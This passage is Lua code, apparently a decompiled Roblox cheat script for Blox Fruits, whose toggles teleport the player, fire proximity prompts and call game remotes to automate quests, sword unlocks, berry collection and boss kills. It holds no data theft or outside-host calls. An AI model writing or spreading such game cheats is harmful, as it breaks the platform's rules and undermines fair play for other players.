                            n3 = 17
                        elseif n3 == 17 then
                            v43 = v39(v40, v42)

                            if v43 == nil then
                                n3 = 19
                            else
                                n3 = 18
                            end
                        elseif n3 == 18 then
                            v42 = v43
                            Ex = v43
                            n3 = 17
                        elseif n3 == 19 then
                            if Ex == 2 then
                                n3 = 20
                            else
                                n3 = 21
                            end
                        elseif n3 == 20 then
                            wait()
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.HeavenlyDimension.Exit.CFrame

                            if _G.CDK_TS and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) ~= 3 then
                                n3 = 20
                            else
                                n3 = 21
                            end
                        elseif n3 == 21 then
                            wait()
                            n3 = 22
                        elseif n3 == 22 then
                            wait()
                            tween(CFrame.new(-22529.6171875, 5275.77392578125, 3873.5712890625))
                            v44, v45, v46 = pairs(workspace.Map.HeavenlyDimension:GetDescendants())
                            v47 = v46
                            n3 = 23
                        elseif n3 == 23 then
                            v48, v49 = v44(v45, v47)

                            if v48 == nil then
                                n3 = 26
                            else
                                n3 = 24
                            end
                        elseif n3 == 24 then
                            v47 = v48

                            if v49:IsA("ProximityPrompt") then
                                n3 = 25
                            else
                                n3 = 23
                            end
                        elseif n3 == 25 then
                            fireproximityprompt(v49)
                            n3 = 23
                        elseif n3 == 26 then
                            if (CFrame.new(-22529.6171875, 5275.77392578125, 3873.5712890625).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5 then
                                n3 = 27
                            else
                                n3 = 22
                            end
                        elseif n3 == 27 then
                            wait(2)
                            _G.DoneT1 = true

                            if _G.CDK_TS and not _G.DoneT1 then
                                n3 = 21
                            else
                                n3 = 28
                            end
                        elseif n3 == 28 then
                            wait()
                            n3 = 29
                        elseif n3 == 29 then
                            wait()
                            tween(CFrame.new(-22637.291015625, 5281.365234375, 3749.28857421875))
                            v50, v51, v52 = pairs(workspace.Map.HeavenlyDimension:GetDescendants())
                            v53 = v52
                            n3 = 30
                        elseif n3 == 30 then
                            v54, v55 = v50(v51, v53)

                            if v54 == nil then
                                n3 = 33
                            else
                                n3 = 31
                            end
                        elseif n3 == 31 then
                            v53 = v54

                            if v55:IsA("ProximityPrompt") then
                                n3 = 32
                            else
                                n3 = 30
                            end
                        elseif n3 == 32 then
                            fireproximityprompt(v55)
                            n3 = 30
                        elseif n3 == 33 then
                            if (CFrame.new(-22637.291015625, 5281.365234375, 3749.28857421875).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5 then
                                n3 = 34
                            else
                                n3 = 29
                            end
                        elseif n3 == 34 then
                            wait(2)
                            _G.DoneT2 = true

                            if not _G.DoneT2 and _G.CDK_TS ~= false then
                                n3 = 28
                            else
                                n3 = 35
                            end
                        elseif n3 == 35 then
                            wait()
                            n3 = 36
                        elseif n3 == 36 then
                            task.wait()
                            tween(CFrame.new(-22791.14453125, 5277.16552734375, 3764.570068359375))
                            v56, v57, v58 = pairs(workspace.Map.HeavenlyDimension:GetDescendants())
                            v59 = v58
                            n3 = 37
                        elseif n3 == 37 then
                            v60, v61 = v56(v57, v59)

                            if v60 == nil then
                                n3 = 40
                            else
                                n3 = 38
                            end
                        elseif n3 == 38 then
                            v59 = v60

                            if v61:IsA("ProximityPrompt") then
                                n3 = 39
                            else
                                n3 = 37
                            end
                        elseif n3 == 39 then
                            fireproximityprompt(v61)
                            n3 = 37
                        elseif n3 == 40 then
                            if (CFrame.new(-22791.14453125, 5277.16552734375, 3764.570068359375).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5 then
                                n3 = 41
                            else
                                n3 = 36
                            end
                        elseif n3 == 41 then
                            wait(2)
                            _G.DoneT3 = true

                            if not _G.DoneT3 and _G.CDK_TS ~= false then
                                n3 = 35
                            else
                                n3 = 42
                            end
                        elseif n3 == 42 then
                            v62, v63, v64 = pairs(workspace.Enemies:GetChildren())
                            v65 = v64
                            n3 = 43
                        elseif n3 == 43 then
                            v66, v67 = v62(v63, v65)

                            if v66 == nil then
                                n3 = 64
                            else
                                n3 = 44
                            end
                        elseif n3 == 44 then
                            v65 = v66

                            if (v67:FindFirstChild("HumanoidRootPart").Position - CFrame.new(-22695.7012, 5270.93652, 3814.42847, 0.11794927, 3.32185834e-08, 0.99301964, -8.73070718e-08, 1, -2.30819008e-08, -0.99301964, -8.3975138e-08, 0.11794927).Position).Magnitude <= 300 and v67:FindFirstChild("HumanoidRootPart") and v67:FindFirstChild("Humanoid") and v67:FindFirstChild("Humanoid").Health > 0 then
                                n3 = 45
                            else
                                n3 = 43
                            end
                        elseif n3 == 45 then
                            wait()
                            Kill(v67, _G.CDK_TS)

                            if _G.CDK_TS and v67.Humanoid.Health > 0 and v67.Parent then
                                n3 = 45
                            else
                                n3 = 43
                            end
                        elseif n3 == 46 then
                            tween(ReplicatedStorage:FindFirstChild("Cake Queen").HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
                            n3 = 64
                        elseif n3 == 47 then
                            QuestTushita_1 = false
                            QuestTushita_2 = true
                            QuestTushita_3 = false
                            n3 = 48
                        elseif n3 == 48 then
                            wait()
                            _G.autopiratesea = true

                            if _G.CDK_TS and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) ~= 2 then
                                n3 = 48
                            else
                                n3 = 49
                            end
                        elseif n3 == 49 then
                            _G.autopiratesea = false
                            n3 = 64
                        elseif n3 == 50 then
                            QuestTushita_1 = true
                            QuestTushita_2 = false
                            QuestTushita_3 = false
                            n3 = 51
                        elseif n3 == 51 then
                            wait()
                            tween(CFrame.new(-4602.5107421875, 16.446542739868164, -2880.998046875))

                            if (CFrame.new(-4602.5107421875, 16.446542739868164, -2880.998046875).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3 and _G.CDK_TS and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) ~= 1 then
                                n3 = 51
                            else
                                n3 = 52
                            end
                        elseif n3 == 52 then
                            if (CFrame.new(-4602.5107421875, 16.446542739868164, -2880.998046875).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                                n3 = 53
                            else
                                n3 = 54
                            end
                        elseif n3 == 53 then
                            wait(0.7)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"), "Check")
                            wait(0.5)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"))
                            n3 = 54
                        elseif n3 == 54 then
                            wait(1)
                            n3 = 55
                        elseif n3 == 55 then
                            wait()
                            tween(CFrame.new(4001.185302734375, 10.089399337768555, -2654.86328125))

                            if (CFrame.new(4001.185302734375, 10.089399337768555, -2654.86328125).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3 and _G.CDK_TS and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) ~= 1 then
                                n3 = 55
                            else
                                n3 = 56
                            end
                        elseif n3 == 56 then
                            if (CFrame.new(4001.185302734375, 10.089399337768555, -2654.86328125).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                                n3 = 57
                            else
                                n3 = 58
                            end
                        elseif n3 == 57 then
                            wait(0.7)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"), "Check")
                            wait(0.5)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"))
                            n3 = 58
                        elseif n3 == 58 then
                            wait(1)
                            n3 = 59
                        elseif n3 == 59 then
                            wait()
                            tween(CFrame.new(-9530.763671875, 7.245208740234375, -8375.5087890625))

                            if (CFrame.new(-9530.763671875, 7.245208740234375, -8375.5087890625).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3 and _G.CDK_TS and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) ~= 1 then
                                n3 = 59
                            else
                                n3 = 60
                            end
                        elseif n3 == 60 then
                            if (CFrame.new(-9530.763671875, 7.245208740234375, -8375.5087890625).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                                n3 = 61
                            else
                                n3 = 62
                            end
                        elseif n3 == 61 then
                            wait(0.7)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"), "Check")
                            wait(0.5)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", workspace.NPCs:FindFirstChild("Luxury Boat Dealer"))
                            n3 = 62
                        elseif n3 == 62 then
                            wait(1)
                            n3 = 64
                        elseif n3 == 63 then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Good")
                            n3 = 64
                        elseif n3 == 64 then
                            return
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Cursed Dual Katana (Last quest)",
            Default = GetSetting("CDK", false),
            Callback = function(cdk)
                _G.CDK = cdk
                _G.SaveData.CDK = cdk
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.15) do
                pcall(function()
                    if _G.CDK then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Good")
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil")
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Boss")
                        local v33 = MobCheck("Cursed Skeleton Boss")

                        if v33 then
                            repeat
                                wait()

                                if not localPlayer8.Character:FindFirstChild("Yama") and not localPlayer8.Backpack:FindFirstChild("Yama") then
                                    if localPlayer8.Character:FindFirstChild("Tushita") or localPlayer8.Backpack:FindFirstChild("Tushita") then
                                        EquipWeapon("Tushita")
                                    end
                                else
                                    EquipWeapon("Yama")
                                end

                                tween(v33.HumanoidRootPart.CFrame * CFrame.new(0, 20, 0))
                            until not _G.CDK or not v33.Parent or v33.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(-12318.193359375, 601.9518432617188, -6538.662109375))
                            wait(0.5)
                            tween(workspace.Map.Turtle.Cursed.BossDoor.CFrame)
                        end
                    end
                end)
            end
        end)
    end

    v4:AddSection("Quests")

    if World3 then
        v4:AddToggle({
            Name = "Auto Citizen Quest",
            Default = GetSetting("citizen", false),
            Callback = function(citizen)
                _G.citizen = citizen
                _G.SaveData.citizen = citizen
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                pcall(function()
                    if _G.citizen then
                        if Lv >= 1800 and ReplicatedStorage.Remotes.CommF_:InvokeServer("citizenProgress").KilledBandits == false then
                            if string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Forest Pirate") and string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and localPlayer.PlayerGui.Main.Quest.Visible == true then
                                local v31 = MobCheck("Forest Pirate")

                                if v31 then
                                    repeat
                                        task.wait()
                                        Kill(v31, _G.citizen)
                                    until _G.citizen == false or not v31.Parent or v31.Humanoid.Health <= 0 or localPlayer.PlayerGui.Main.Quest.Visible == false
                                else
                                    tween(CFrame.new(-13206.452148438, 425.89199829102, -7964.5537109375))
                                end
                            else
                                tween(CFrame.new(-12443.8671875, 332.40396118164, -7675.4892578125))

                                if (Vector3.new(-12443.8671875, 332.40396118164, -7675.4892578125) - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 30 then
                                    wait(1.5)
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", "citizen", 1)
                                end
                            end
                        elseif Lv >= 1800 and ReplicatedStorage.Remotes.CommF_:InvokeServer("citizenProgress").KilledBoss == false then
                            local v31 = MobCheck("Captain Elephant")

                            if localPlayer.PlayerGui.Main.Quest.Visible and string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Captain Elephant") and localPlayer.PlayerGui.Main.Quest.Visible == true then
                                if v31 then
                                    repeat
                                        task.wait()
                                        Kill(v31, _G.citizen)
                                    until _G.citizen == false or v31.Humanoid.Health <= 0 or not v31.Parent or localPlayer.PlayerGui.Main.Quest.Visible == false
                                else
                                    tween(CFrame.new(-13374.889648438, 421.27752685547, -8225.208984375))
                                end
                            else
                                tween(CFrame.new(-12443.8671875, 332.40396118164, -7675.4892578125))

                                if (CFrame.new(-12443.8671875, 332.40396118164, -7675.4892578125).Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 4 then
                                    wait(1.5)
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("citizenProgress", "Citizen")
                                end
                            end
                        elseif Lv >= 1800 and ReplicatedStorage.Remotes.CommF_:InvokeServer("citizenProgress", "Citizen") == 2 then
                            tween(CFrame.new(-12512.138671875, 340.39279174805, -9872.8203125))
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Training Dummy",
            Default = GetSetting("DummyMan", false),
            Callback = function(dummyMan)
                _G.DummyMan = dummyMan
                _G.SaveData.DummyMan = dummyMan
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                if _G.DummyMan then
                    pcall(function()
                        if localPlayer.PlayerGui.Main.Quest.Visible == false then
                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack({"ArenaTrainer"}))
                        else
                            local v31 = MobCheck("Training Dummy")

                            if v31 then
                                repeat
                                    wait()
                                    Kill(v31, _G.DummyMan)
                                until not _G.DummyMan or not v31.Parent or v31.Humanoid.Health <= 0
                            else
                                tween(CFrame.new(3688.005126953125, 12.746943473815918, 170.20953369140625))
                            end
                        end
                    end)
                end
            end
        end)
    end

    if World2 then
        v4:AddToggle({
            Name = "Auto Bartilo Quest",
            Default = GetSetting("bartilonv", false),
            Callback = function(bartilonv)
                _G.bartilonv = bartilonv
                _G.SaveData.bartilonv = bartilonv
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                pcall(function()
                    if _G.bartilonv and Lv >= 850 then
                        local quest = localPlayer.PlayerGui.Main.Quest

                        if ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 0 then
                            _G.Level = false

                            if quest.Visible == true then
                                if MobCheck("Swan Pirate") then
                                    local v31 = MobCheck(tbl7)

                                    if v31 then
                                        repeat
                                            task.wait()

                                            if string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan Pirate") then
                                                Kill(v31, _G.bartilonv)
                                            else
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                            end
                                        until _G.bartilonv == false or not v31.Parent or v31.Humanoid.Health <= 0 or quest.Visible == false or not v31:FindFirstChild("HumanoidRootPart")
                                    end
                                else
                                    tween(CFrame.new(970.369446, 142.653198, 1217.3667, 0.162079468, -4.85452638e-08, -0.986777723, 1.03357589e-08, 1, -4.74980872e-08, 0.986777723, -2.50063148e-09, 0.162079468))
                                end
                            else
                                repeat
                                    wait()
                                    tween(CFrame.new(-461.533203, 72.3478546, 300.311096, 0.050853312, -0.0, -0.998706102, 0, 1, -0.0, 0.998706102, 0, 0.050853312))
                                until (CFrame.new(-461.533203, 72.3478546, 300.311096, 0.050853312, -0.0, -0.998706102, 0, 1, -0.0, 0.998706102, 0, 0.050853312).Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 20 or _G.bartilonv == false

                                if (CFrame.new(-461.533203, 72.3478546, 300.311096, 0.050853312, -0.0, -0.998706102, 0, 1, -0.0, 0.998706102, 0, 0.050853312).Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 1 then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", "BartiloQuest", 1)
                                end
                            end
                        elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 1 then
                            _G.Level = false
                            local Jeremy = MobCheck("Jeremy")

                            if Jeremy then
                                repeat
                                    task.wait()
                                    Kill(Jeremy, _G.bartilonv)
                                until _G.bartilonv == false or not Jeremy.Parent or Jeremy.Humanoid.Health <= 0 or quest.Visible == false or not Jeremy:FindFirstChild("HumanoidRootPart")
                            else
                                tween(CFrame.new(2158.97412, 449.056244, 705.411682, -0.754199564, -4.17389057e-09, -0.656645238, -4.47752875e-08, 1, 4.50709301e-08, 0.656645238, 6.3393955e-08, -0.754199564))
                            end
                        elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 2 then
                            repeat
                                wait()
                                tween(CFrame.new(-1830.83972, 10.5578213, 1680.60229, 0.979988456, -2.02152783e-08, -0.199054286, 2.20792113e-08, 1, 7.1442483e-09, 0.199054286, -1.13962431e-08, 0.979988456))
                            until (CFrame.new(-1830.83972, 10.5578213, 1680.60229, 0.979988456, -2.02152783e-08, -0.199054286, 2.20792113e-08, 1, 7.1442483e-09, 0.199054286, -1.13962431e-08, 0.979988456).Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 1 or _G.bartilonv == false

                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate1.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate2.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate3.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate4.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate5.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate6.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate7.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate8.CFrame
                            wait(2.5)
                        end
                    end
                end)
            end
        end)
    end

    v4:AddSection("Berries")

    v4:AddToggle({
        Name = "Auto Collect Berries",
        Default = GetSetting("AutoBerry", false),
        Callback = function(autoBerry)
            _G.AutoBerry = autoBerry
            _G.SaveData.AutoBerry = autoBerry
            SaveSettings()
        end,
    })

    spawn(function()
        local CollectionService, tagged, huge, n3, n4, n5, v31, v32, v33, v34, v35, v36, v37, v38, v39, v40, v41, n6, v42, v43
        local v44, v45, v46, v47, n7, n8, v48, v49, v50, v51, v52, v53, v54, v55, v56, v57, v58, n9
        n9 = 1

        while true do
            if n9 == 1 then
                if wait(Sec) then
                    n9 = 2
                else
                    n9 = 17
                end
            elseif n9 == 2 then
                if _G.AutoBerry then
                    n9 = 3
                else
                    n9 = 1
                end
            elseif n9 == 3 then
                CollectionService = game:GetService("CollectionService")
                game:GetService("Players")
                tagged = CollectionService:GetTagged("BerryBush")
                huge = math.huge
                n3 = 0
                n4 = #tagged + 0
                n9 = 4
            elseif n9 == 4 then
                n5 = n3 + 1

                if n5 <= n4 then
                    n9 = 5
                else
                    n9 = 1
                end
            elseif n9 == 5 then
                v31 = tagged[n5]
                v32, v33, v34 = pairs(v31:GetAttributes())
                v35 = v34
                v36 = v32
                v37 = v33
                v38 = n4
                v39 = n5
                n9 = 6
            elseif n9 == 6 then
                v40, v41 = v36(v37, v35)

                if v40 == nil then
                    n9 = 16
                else
                    n9 = 7
                end
            elseif n9 == 7 then
                v35 = v40

                if BerryArray and not table.find(BerryArray, v41) then
                    n9 = 6
                else
                    n9 = 8
                end
            elseif n9 == 8 then
                tween(v31.Parent:GetPivot())
                n6 = 0
                v42 = v38
                v43 = v39
                v44 = n4
                v45 = v40
                v46 = v36
                v47 = v37
                n7 = #tagged + 0
                n9 = 9
            elseif n9 == 9 then
                n8 = n6 + 1

                if n8 <= n7 then
                    n9 = 11
                else
                    n9 = 10
                end
            elseif n9 == 10 then
                v38 = v42
                v39 = v43
                v35 = v45
                v36 = v46
                v37 = v47
                n4 = v44
                n9 = 6
            elseif n9 == 11 then
                v48, v49, v50 = pairs(tagged[n8]:GetChildren())
                v51 = v45
                v52 = v46
                v53 = v47
                v54 = v50
                v55 = v42
                v56 = v44
                n9 = 12
            elseif n9 == 12 then
                v57, v58 = v48(v49, v54)

                if v57 == nil then
                    n9 = 15
                else
                    n9 = 13
                end
            elseif n9 == 13 then
                v54 = v57

                if BerryArray and not table.find(BerryArray, v58) then
                    n9 = 12
                else
                    n9 = 14
                end
            elseif n9 == 14 then
                tween(v58.WorldPivot)
                fireproximityprompt(v58.ProximityPrompt, math.huge)
                n9 = 12
            elseif n9 == 15 then
                v42 = v55
                v44 = v56
                v45 = v51
                v46 = v52
                v47 = v53
                n6 = n8
                n9 = 9
            elseif n9 == 16 then
                n3 = v39
                n4 = v38
                n9 = 4
            elseif n9 == 17 then
                return
            end
        end
    end)

    if World2 then
        v4:AddSection("True Triple Katana")

        v4:AddButton({
            Name = "Buy Legendary Sword",
            Callback = function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LegendarySwordDealer", "1")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LegendarySwordDealer", "2")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LegendarySwordDealer", "3")
            end,
        })

        v4:AddButton({
            Name = "Buy True Triple Katana Sword",
            Callback = function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan", "2")
            end,
        })

        v4:AddToggle({
            Name = "Tween to Legendary Sword Dealer",
            Default = GetSetting("Tp_LgS", false),
            Callback = function(tpLgS)
                _G.Tp_LgS = tpLgS
                _G.SaveData.Tp_LgS = tpLgS
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(1) do
                if _G.Tp_LgS then
                    pcall(function()
                        for k, child in pairs(game:GetService("ReplicatedStorage").NPCs:GetChildren()) do
                            if child.Name == "Legendary Sword Dealer " then
                                tween(child.HumanoidRootPart.CFrame)
                            end
                        end
                    end)
                end
            end
        end)
    end

    if World1 then
        v4:AddSection("Polo Sword")

        v4:AddToggle({
            Name = "Auto Get Pole Sword",
            Default = GetSetting("AutoPole", false),
            Callback = function(autoPole)
                _G.AutoPole = autoPole
                _G.SaveData.AutoPole = autoPole
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(1) do
                if _G.AutoPole then
                    pcall(function()
                        local v31 = MobCheck("Thunder God")

                        if v31 then
                            repeat
                                task.wait()
                                Kill(v31, _G.AutoPole)
                            until not _G.AutoPole or not v31.Parent or v31.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(-7994.984375, 5761.025390625, -2088.6479492188))
                        end
                    end)
                end
            end
        end)
    end

    if World2 then
        v4:AddSection("Law Raid")

        v4:AddToggle({
            Name = "Auto Kill Law",
            Default = GetSetting("laww", false),
            Callback = function(laww)
                _G.laww = laww
                _G.SaveData.laww = laww
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(1) do
                if _G.laww then
                    pcall(function()
                        local Order = MobCheck("Order")

                        if Order then
                            repeat
                                task.wait()
                                Kill(Order, _G.laww)
                            until _G.laww == false or not Order.Parent or Order.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(-6217.2021484375, 28.047645568848, -5053.1357421875))
                        end
                    end)
                end
            end
        end)

        v4:AddButton({
            Name = "Buy Microchip Law",
            Callback = function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "2")
            end,
        })

        v4:AddButton({
            Name = "Start Law Raids",
            Callback = function()
                fireclickdetector(workspace.Map.CircleIsland.RaidSummon.Button.Main.ClickDetector)
            end,
        })
    end

    if World1 then
        v4:AddSection("First Sea Items")

        v4:AddToggle({
            Name = "Auto Saw Sword",
            Default = GetSetting("farmsaw", false),
            Callback = function(farmsaw)
                _G.farmsaw = farmsaw
                _G.SaveData.farmsaw = farmsaw
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.2) do
                pcall(function()
                    if _G.farmsaw then
                        local v31 = MobCheck("The Saw")

                        if v31 then
                            repeat
                                task.wait()
                                Kill(v31, _G.farmsaw)
                            until _G.farmsaw == false or v31.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(-784.89715576172, 72.427383422852, 1603.5822753906))
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Unlock Saber",
            Default = GetSetting("farmsb", false),
            Callback = function(farmsb)
                _G.farmsb = farmsb
                _G.SaveData.farmsb = farmsb
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.2) do
                pcall(function()
                    local v31, v32, v33, v34, v35, v36, v37, v38, v39, v40, v41, v42, n3
                    n3 = 1

                    while true do
                        if n3 == 1 then
                            if _G.farmsb and localPlayer.Data.Level.Value >= 200 and not localPlayer.Backpack:FindFirstChild("Saber") and not localPlayer.Character:FindFirstChild("Saber") then
                                n3 = 2
                            else
                                n3 = 31
                            end
                        elseif n3 == 2 then
                            if workspace.Map.Jungle.Final.Part.Transparency == 0 then
                                n3 = 11
                            else
                                n3 = 3
                            end
                        elseif n3 == 3 then
                            if not workspace.Enemies:FindFirstChild("Saber Expert") and not game:GetService("ReplicatedStorage"):FindFirstChild("Saber Expert") then
                                n3 = 10
                            else
                                n3 = 4
                            end
                        elseif n3 == 4 then
                            v31, v32, v33 = pairs(workspace.Enemies:GetChildren())
                            v34 = v33
                            n3 = 5
                        elseif n3 == 5 then
                            v35, v36 = v31(v32, v34)

                            if v35 == nil then
                                n3 = 31
                            else
                                n3 = 6
                            end
                        elseif n3 == 6 then
                            v34 = v35

                            if v36.Name == "Saber Expert" and index.Alive(v36) then
                                n3 = 7
                            else
                                n3 = 5
                            end
                        elseif n3 == 7 then
                            task.wait()
                            Kill(v36, _G.farmsb)

                            if v36.Humanoid.Health > 0 and _G.farmsb ~= false then
                                n3 = 7
                            else
                                n3 = 8
                            end
                        elseif n3 == 8 then
                            if v36.Humanoid.Health <= 0 then
                                n3 = 9
                            else
                                n3 = 5
                            end
                        elseif n3 == 9 then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "PlaceRelic")
                            n3 = 5
                        elseif n3 == 10 then
                            tween(CFrame.new(-1401.85046, 29.9773273, 8.81916237, 0.85820812, 8.76083845e-08, 0.513301849, -8.55007443e-08, 1, -2.77243419e-08, -0.513301849, -2.00944328e-08, 0.85820812))
                            n3 = 31
                        elseif n3 == 11 then
                            if workspace.Map.Jungle.QuestPlates.Door.Transparency == 0 then
                                n3 = 28
                            else
                                n3 = 12
                            end
                        elseif n3 == 12 then
                            if workspace.Map.Desert.Burn.Part.Transparency == 0 then
                                n3 = 25
                            else
                                n3 = 13
                            end
                        elseif n3 == 13 then
                            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan") == 0 then
                                n3 = 15
                            else
                                n3 = 14
                            end
                        elseif n3 == 14 then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "GetCup")
                            wait(0.5)
                            EquipWeapon("Cup")
                            wait(0.5)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "FillCup", localPlayer.Character.Cup)
                            wait(1)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan")
                            n3 = 31
                        elseif n3 == 15 then
                            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == nil then
                                n3 = 24
                            else
                                n3 = 16
                            end
                        elseif n3 == 16 then
                            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 0 then
                                n3 = 19
                            else
                                n3 = 17
                            end
                        elseif n3 == 17 then
                            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 1 then
                                n3 = 18
                            else
                                n3 = 31
                            end
                        elseif n3 == 18 then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                            EquipWeapon("Relic")
                            tween(CFrame.new(-1404.91504, 29.9773273, 3.80598116, 0.876514494, 5.66906877e-09, 0.481375456, 2.53851997e-08, 1, -5.79995607e-08, -0.481375456, 6.30572643e-08, 0.876514494))
                            n3 = 31
                        elseif n3 == 19 then
                            if not workspace.Enemies:FindFirstChild("Mob Leader") and not game:GetService("ReplicatedStorage"):FindFirstChild("Mob Leader") then
                                n3 = 31
                            else
                                n3 = 20
                            end
                        elseif n3 == 20 then
                            tween(CFrame.new(-2967.59521, -4.91089821, 5328.70703, 0.342208564, -0.0227849055, 0.939347804, 0.0251603816, 0.999569714, 0.0150796166, -0.939287126, 0.0184739735, 0.342634559))
                            v37, v38, v39 = pairs(workspace.Enemies:GetChildren())
                            v40 = v39
                            n3 = 21
                        elseif n3 == 21 then
                            v41, v42 = v37(v38, v40)

                            if v41 == nil then
                                n3 = 31
                            else
                                n3 = 22
                            end
                        elseif n3 == 22 then
                            v40 = v41

                            if v42.Name == "Mob Leader" and index.Alive(v42) then
                                n3 = 23
                            else
                                n3 = 21
                            end
                        elseif n3 == 23 then
                            task.wait()
